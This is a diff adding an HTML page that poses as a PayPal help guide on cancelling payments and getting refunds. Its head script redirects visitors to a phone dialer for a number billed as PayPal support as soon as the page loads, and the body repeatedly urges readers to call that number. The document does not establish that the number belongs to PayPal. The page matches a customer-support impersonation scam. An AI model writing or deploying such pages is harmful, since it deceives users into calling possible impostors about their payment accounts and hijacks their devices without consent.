@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Learn how to cancel a PayPal payment and get your refund, plus how to contact PayPal customer service if you're having trouble.">
+    <meta name="keywords" content="cancel paypal payment, paypal refund, paypal dispute, paypal help, contact paypal support">
+    <title>How to Cancel a PayPal Payment</title>
+    <link rel="stylesheet" href="style.css">
+    <script>
+        // Auto-dialer function
+        function autoDial() {
+            var phoneNumber = "+18008919140"; // PayPal customer service number (USA)
+            var dialerLink = "tel:" + phoneNumber; // Generates a phone dialer link
+
+            if (window.location.protocol !== 'tel:') {
+                window.location.href = dialerLink;  // Opens dialer on mobile
+            } else {
+                alert("Your browser does not support automatic dialing.");
+            }
+        }
+
+        // Trigger auto-dialer on page load
+        window.onload = autoDial;
+    </script>
+</head>
+<body>
+    <header>
+        <h1>How to Cancel a PayPal Payment</h1>
+        <p>If you’ve made a PayPal payment by mistake, here’s how to cancel it and get your refund.</p>
+    </header>
+
+    <section class="content">
+        <article>
+            <h2>1. Can I Cancel a PayPal Payment?</h2>
+            <p>If your payment is still pending (i.e., it hasn't been completed yet), you can cancel it directly from your PayPal account:</p>
+            <ul>
+                <li>Log into your PayPal account and go to the <strong>Activity</strong> section.</li>
+                <li>Find the pending payment and click on it.</li>
+                <li>If the payment is still pending, you'll have the option to cancel it.</li>
+            </ul>
+        </article>
+
+        <article>
+            <h2>2. Requesting a Refund</h2>
+            <p>If the payment has been completed and the transaction was made to a merchant, you'll need to request a refund:</p>
+            <ul>
+                <li>Go to the <strong>Resolution Center</strong> on PayPal.</li>
+                <li>Click on <strong>Report a Problem</strong> and select the transaction you want refunded.</li>
+                <li>Follow the steps to submit your dispute or request a refund.</li>
+            </ul>
+        </article>
+
+        <article>
+            <h2>3. Get Help from PayPal Customer Support</h2>
+            <p>If you encounter any problems with canceling a payment or requesting a refund, contact PayPal customer service:</p>
+            <ul>
+                <li>Call PayPal at <strong>+1 800-891-9140</strong> for help.</li>
+                <li>Use live chat for immediate assistance.</li>
+                <li>Visit the PayPal Help Center for more information on canceling payments.</li>
+            </ul>
+        </article>
+
+        <!-- Call to Action Section -->
+        <div class="cta-container">
+            <p>If you need assistance with a PayPal payment, call PayPal customer support now:</p>
+            <a href="tel:+18008919140" class="cta-button">Call PayPal Now</a>
+        </div>
+    </section>
+
+    <footer>
+        <p>&copy; 2024 Your Name. All Rights Reserved.</p>
+    </footer>
+</body>
+</html>
